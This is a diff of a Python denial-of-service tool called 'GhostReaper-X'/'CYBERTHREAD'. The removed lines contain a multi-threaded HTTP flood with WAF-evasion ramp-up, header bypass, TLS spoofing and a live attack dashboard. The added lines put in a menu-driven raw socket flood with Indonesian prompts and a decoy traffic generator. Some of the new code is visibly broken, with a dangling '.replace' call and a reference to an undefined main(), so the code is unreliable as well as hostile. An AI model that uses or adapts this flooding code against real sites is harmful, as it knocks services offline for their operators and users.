@@ -202,6 +202,7 @@ def handle_response(response, target, rtt):
                 rotate_headers_and_tls()
         elif status_code == 429:
             print(f"{ANSI_YELLOW}[429] Rate Limit - Throttle Mode{ANSI_RESET}")
+            time.sleep(random.uniform(2, 4))  # Adaptive delay for 429
         elif status_code == 503:
             print(f"{ANSI_YELLOW}[503] Overload - Increasing Pressure{ANSI_RESET}")
         else:
@@ -317,169 +318,53 @@ def slow_chunked_post(host, port=443):
     except Exception:
         pass
 
+def dummy_traffic():
+    while not stop_event.is_set():
+        try:
+            conn = http.client.HTTPSConnection(parsed_url.hostname)
+            path = random.choice(["/about", "/faq", "/assets", "/logo.png"])
+            conn.request("GET", path)
+            conn.getresponse()
+        except: pass
+        time.sleep(random.uniform(10, 20))
+
 def launch_ghost_sequence():
     global target, threads, payload_type, ua_file, bypass_header, tls_spoofing, session_cycle, delay, flood_method, failover_monitoring, silent_mode, log_file, parsed_url
     parsed_url = urlparse(target)
 
-    print("\nReady to launch GhostReaper-X Sequence")
-    print(f"Target     : {target}")
-    print(f"Threads    : {threads}")
-    print(f"Payload    : {payload_type}")
-    print(f"TLS Finger : {'Enabled' if tls_spoofing else 'Disabled'}")
-    print(f"Header Bypass : {'Enabled' if bypass_header else 'Disabled'}")
-    print(f"Session Cycle : {'Enabled' if session_cycle else 'Disabled'}")
-    print(f"Delay      : {delay}s")
-    print(f"Flood Method: {flood_method}")
-    print(f"Failover Monitoring : {'Enabled' if failover_monitoring else 'Disabled'}")
-    print(f"Silent Mode : {'Enabled' if silent_mode else 'Disabled'}")
-    print(f"Log File   : {log_file_path if log_file_path else 'None'}")
+    print("\nDDOS-THREAD")
+    print("[ 1 ] Target : ")
+    print("[ 2 ] Exit ")
+    choice = input("Pilih opsi: ")
 
-    load_user_agents(ua_file)
+    if choice == '1':
+        target = input("Masukkan target (contoh: https://target.com): ")
+        if not target.startswith("http://") and not target.startswith("https://"):
+            target = "http://" + target
 
-    print(f"[✓] Running recon on {target} ...")
-    recon_target(target)
+        target = target.replace("http://", "").replace
+        target = target.replace("http://", "").replace("https://", "")
 
-    def worker():
-        local_retry = 0
-        while not stop_event.is_set():
-            try:
-                semaphore.acquire()
-                conn = http.client.HTTPSConnection(parsed_url.hostname, context=rotate_tls_context())
-                paths = ["/", "/ping", "/admin", "/admin/login", "/?debug", "/v1/chain"]
-                chain_path = random.choice(paths)
-                payload_data = smart_mutate(mutate_payload(payload_type))
-                method = random.choice(["POST", "PUT", "PATCH", "DELETE", "OPTIONS"])
-                if random.random() > 0.7:
-                    conn.request("GET", random.choice(["/", "/home", "/product?id=1", "/help"]))
-                    conn.getresponse()
-                conn.request(method, chain_path, payload_data, inject_headers())
-                start_time = time.time()
-                response = conn.getresponse()
-                rtt = time.time() - start_time
-                handle_response(response, target, rtt)
-                if session_cycle:
-                    cycle_session()
-                if failover_monitoring and response.status in [403, 429, 503]:
-                    local_retry += 1
-                    if local_retry >= max_retries:
-                        stop_event.set()
-                        break
-                    time.sleep(delay + random.uniform(0.2, 1.0))
-                if time.time() % 7 < 2:
-                    threading.Thread(target=raw_socket_blast, args=(parsed_url.hostname,)).start()
-                if time.time() % 8 > 5:
-                    time.sleep(2.5)  # Delay burst cooldown
-            except Exception as e:
-                if log_file:
-                    with open(log_file_path, 'a') as f:
-                        f.write(f"{ANSI_RED}[ERROR] worker: {traceback.format_exc()}{ANSI_RESET}\n")
-                else:
-                    print(f"{ANSI_RED}[ERROR] worker: {traceback.format_exc()}{ANSI_RESET}")
-            finally:
-                semaphore.release()
-                time.sleep(delay + random.uniform(0.1, 0.5))
+        port = 80  # Default HTTP port
 
-    thread_pool = []
-    for i in range(threads):
-        thread = threading.Thread(target=worker)
-        thread.start()
-        thread_pool.append(thread)
-        time.sleep(random.uniform(0.01, 0.03))  # WAF evasive ramp-up
+        threads = int(input("Threads : "))
 
-    if not silent_mode:
-        threading.Thread(target=render_dashboard).start()
-    else:
-        threading.Thread(target=print_status).start()
+        for _ in range(threads):
+            thread = threading.Thread(target=ddos, args=(target, port, 60))
+            thread.start()
 
-    if failover_monitoring:
-        threading.Thread(target=monitor_target).start()
+    elif choice == '2':
+        print("Exiting...")
+        exit()
 
-    for thread in thread_pool:
-        thread.join()
+def ddos(target, port, duration):
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect((target, port))
 
-    print("GhostReaper-X sequence terminated.")
-
-def print_status():
-    last_state = {"200": -1, "403": -1, "503": -1}
-    while not stop_event.is_set():
-        if (status_counter["200"] != last_state["200"] or
-            status_counter["403"] != last_state["403"] or
-            status_counter["503"] != last_state["503"]):
-            print(f"✅ 200: {status_counter['200']} | 🔒 403: {status_counter['403']} | ⚠️ 503: {status_counter['503']}")
-            sys.stdout.flush()
-            last_state.update(status_counter)
-        time.sleep(1)
-
-def render_dashboard():
-    global args
-    while not stop_event.is_set():
-        columns = shutil.get_terminal_size().columns
-        now = datetime.now().strftime("%H:%M:%S")
-
-        # Clear screen
-        sys.stdout.write("\033[H\033[J")
-        print(f"{' CYBERTHREAD LIVE DASHBOARD ':=^{columns}}")
-        print(f"Time         : {now}")
-        print(f"Target       : {target}")
-        print(f"Threads      : {threads}")
-        print(f"Payload      : {payload_type}")
-        print(f"Method       : {flood_method.upper()}")
-        print(f"TLS Spoofing : {'ENABLED' if tls_spoofing else 'DISABLED'}")
-        print(f"Header Bypass: {'ENABLED' if bypass_header else 'DISABLED'}")
-        print(f"Stealth Mode  : {'ENABLED' if args.stealth_force else 'DISABLED'}")
-        print("=" * columns)
-        print(f"✅ 200 OK     : {status_counter['200']}")
-        print(f"🔒 403 Blocked: {status_counter['403']}")
-        print(f"⚠️ 503 Overload: {status_counter['503']}")
-        print("=" * columns)
-        print("Press Ctrl+C to stop...\n")
-        time.sleep(1)
-
-def print_banner_brutal():
-    print("""╔══════════════════════════════════════╗
-║   ☠ CYBERTHREAD ☠           ║
-║   Threads: █████            ║
-║   Target: WAF/CDN           ║
-║   Header: Bypass Enabled    ║
-║   TLS: Spoofed              ║
-╚══════════════════════════════════════╝
-    """)
+    payload = b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n"
+    while duration > 0:
+        client.send(payload)
+        duration -= 1
 
 if __name__ == "__main__":
-    global target
-    target = input("Enter the target URL: ") or "https://targetlo.com"
-    threads = int(input("Enter the number of threads (default 200): ") or 200)
-
-    try:
-        parsed_url = urlparse(target)
-        if not parsed_url.scheme or not parsed_url.hostname:
-            raise ValueError("Invalid URL")
-    except Exception:
-        print(f"{ANSI_RED}[ERROR] Invalid target URL: {target}{ANSI_RESET}")
-        sys.exit(1)
-
-    if not log_file_path:
-        log_file_path = f"/sdcard/cyberthread_log_{int(time.time())}.txt"
-
-    print_banner_brutal()
-
-    silent_mode = False
-    ua_file = os.path.expanduser("~/ua_fallback.txt")
-    if not os.path.exists(ua_file):
-        ua_file = "/data/data/com.termux/files/home/ua_fallback.txt"
-
-    bypass_header = True
-    tls_spoofing = True
-    session_cycle = True
-    failover_monitoring = True
-    delay = 0.1
-    payload_type = "ghost-mutation"
-    flood_method = "POST"
-
-    try:
-        socket.gethostbyname(parsed_url.hostname)
-    except socket.gaierror:
-        print(f"{ANSI_RED}[ERROR] Cannot resolve target host: {parsed_url.hostname}{ANSI_RESET}")
-        sys.exit(1)
-
-    launch_ghost_sequence()
+    main()
